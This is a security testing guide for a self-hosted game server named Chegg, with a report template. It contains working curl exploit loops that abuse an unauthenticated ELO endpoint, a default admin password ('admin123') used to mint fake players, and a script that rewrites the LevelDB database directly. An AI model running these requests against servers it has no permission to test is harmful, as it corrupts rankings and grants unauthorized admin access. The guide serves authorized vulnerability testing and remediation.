# Security Testing Guide - Chegg Vulnerabilities

This guide walks you through testing each vulnerability for your security report.

## Prerequisites

- Server running: `npm start` (on port 1109)
- Node.js installed (for JavaScript tests)
- `curl` installed (for bash tests)
- `jq` installed (for JSON parsing in bash tests)

---

## Quick Start - cURL Tests

**Fastest way to verify vulnerabilities:**

```bash
# Make the script executable
chmod +x test_vulnerabilities.sh

# Run all tests
./test_vulnerabilities.sh
```

This will:
1. ✅ Test AI Win endpoint without auth
2. ✅ Create fake player and boost ELO 5 times
3. ✅ Check if fake player appears on leaderboard
4. ✅ Try admin password (admin123)
5. ✅ Verify other endpoints
6. ✅ Generate test report

---

## Detailed Manual Tests

### Test 1: AI Win Endpoint (CRITICAL)

**This is the easiest vulnerability to exploit:**

```bash
# Create a test username with timestamp
TESTUSER="hacker_$(date +%s)"

# Award yourself a fake win (no authentication!)
curl -X POST http://localhost:1109/api/player/$TESTUSER/ai-win \
  -H "Content-Type: application/json" \
  -d '{"winner": "player"}'

# Expected response (VULNERABLE):
# {
#   "success": true,
#   "newElo": 1240,
#   "diff": 40,
#   "botElo": 760
# }
```

**Exploit Chain:**
```bash
# Create cheater account
CHEATER="rank1_cheater"

# Run 20 times to get massive ELO
for i in {1..20}; do
  curl -s -X POST "http://localhost:1109/api/player/$CHEATER/ai-win" \
    -H "Content-Type: application/json" \
    -d '{"winner":"player"}' | jq '.newElo'
done
```

**Document this in your report:**
- [ ] Note the ease of exploitation
- [ ] Show the ELO progression (should reach 2000+ easily)
- [ ] Point out the lack of authentication
- [ ] Calculate how quickly rank #1 can be achieved

---

### Test 2: Leaderboard Takeover

```bash
# Step 1: Boost your fake player to top rank
ATTACKER="attacker_rank1"

# Repeat AI wins
for i in {1..30}; do
  curl -s -X POST "http://localhost:1109/api/player/$ATTACKER/ai-win" \
    -H "Content-Type: application/json" \
    -d '{"winner":"player"}' > /dev/null
  echo "Win $i recorded..."
done

# Step 2: Check leaderboard position
curl -s "http://localhost:1109/api/leaderboard" | jq '.players[:5]'

# Expected output shows fake player at rank 1
```

**Document:**
- [ ] Screenshot of leaderboard with fake account at top
- [ ] ELO value before and after attack
- [ ] Time taken to reach rank 1
- [ ] Proof of no authentication required

---

### Test 3: Admin Password Vulnerability

```bash
# Try the default password
curl -X POST http://localhost:1109/api/admin/auth \
  -H "Content-Type: application/json" \
  -d '{"password":"admin123"}'

# If successful (VULNERABLE):
# Response: {"success":true, "token":"..."}

# Use the token to create players:
ADMIN_TOKEN="<token_from_above>"

curl -X POST http://localhost:1109/api/admin/player \
  -H "Authorization: Bearer $ADMIN_TOKEN" \
  -H "Content-Type: application/json" \
  -d '{
    "username": "admin_fake_player",
    "elo": 9999,
    "wins": 5000,
    "losses": 0,
    "force": true
  }'
```

**Document:**
- [ ] Show that default password works
- [ ] Demonstrate admin token generation
- [ ] Prove ability to create arbitrary players with any ELO
- [ ] Show token validity period (24 hours)

---

### Test 4: Client-Side Mana Manipulation

**This one is NOT exploitable (good design), but document it:**

```javascript
// Open browser DevTools during a game
// Console tab:

// Try to cheat by modifying mana
gameState.players.blue.mana = 999;

// Try to play an expensive card that costs more than real mana
// Server will REJECT it because it validates on backend

// Document:
// - Server has authoritative game state
// - Client UI changes are ignored
// - This vulnerability is BLOCKED ✓
```

**What to write in report:**
- The server correctly validates all mana spending
- Client-side manipulation cannot bypass server validation
- This is a **well-designed security control**

---

### Test 5: Database Direct Access

**If you have filesystem access to the server:**

```javascript
// Create test_db.js
import { Level } from 'level';

const db = new Level('./db/chegg-games', { valueEncoding: 'json' });

// Read a player record
const player = await db.get('user:testuser');
console.log('Current:', player);

// Modify directly
player.elo = 10000;
player.wins = 9999;
player.losses = 0;

await db.put('user:testuser', player);
console.log('Modified:', await db.get('user:testuser'));

await db.close();
```

**Run it:**
```bash
node test_db.js
```

**Document:**
- [ ] Show ability to read/write LevelDB directly
- [ ] Demonstrate permanent leaderboard changes
- [ ] Note lack of encryption or access controls
- [ ] Highlight no audit logging

---

## JavaScript Test Suite

**For more automated testing:**

```bash
# Install dependency (if not already installed)
npm install node-fetch@2

# Run the automated tests
node test_vulnerabilities.js
```

This generates a detailed report with:
- Test results
- Vulnerability confirmations
- Exploitation difficulty ratings
- Impact assessments

---

## Report Writing Template

Use this structure for your security report:

### Section: Vulnerability Details

#### Vulnerability 1: Unauthenticated AI Win Endpoint
- **CVE-Like Severity:** CRITICAL (9.8)
- **CVSS Score:** 10.0 (No authentication required)
- **Affected Endpoint:** `POST /api/player/:username/ai-win`
- **Description:** [Include screenshots/curl output]
- **Proof of Concept:** [Include command used + response]
- **Impact:** [ELO progression you achieved]
- **Affected Code:** `server/index.js` lines 354-395
- **How to Fix:** 
  1. Require valid authentication token
  2. Verify token belongs to :username parameter
  3. Validate token against known tokens from WebSocket auth

#### Vulnerability 2: Weak Admin Password
- **CVE-Like Severity:** CRITICAL (9.8)
- **Affected Endpoint:** `POST /api/admin/auth`
- **Proof:** Default password `admin123` grants full access
- **Token Lifetime:** 24 hours (too long)

[Similar sections for other vulnerabilities]

---

## Cleanup

After testing, clean up the fake players:

```bash
# Check database
curl -s http://localhost:1109/api/leaderboard | jq '.players[] | select(.username | startswith("testuser_", "cheater_", "hacker_"))'

# You would need admin access to delete them
```

---

## Important Notes

- ✅ **Test only on YOUR OWN instance**
- ✅ **Do not test on production/live servers**
- ✅ **Document all findings carefully**
- ✅ **Include timestamps in your report**
- ✅ **Save all curl output/screenshots**
- ⚠️ **Be ethical - this is for authorized security testing only**

---

## Expected Findings Summary

Your report should show:

| Vulnerability | Severity | Confirmed | Evidence |
|---|---|---|---|
| Auth bypass on `/api/player/:username/ai-win` | CRITICAL | ✅ | Curl output showing `success: true` without credentials |
| ELO unlimited boost | CRITICAL | ✅ | Loop showing +40 per request × 20 = 800+ ELO gain |
| Admin default password | CRITICAL | ✅ | Successful auth with `admin123` |
| Leaderboard reflects fake data | CRITICAL | ✅ | Fake player visible in top rankings |
| No rate limiting effective | HIGH | ✅ | Multiple requests per second accepted |
| Client mana manipulation | LOW | ❌ | Server correctly rejects (this is GOOD) |

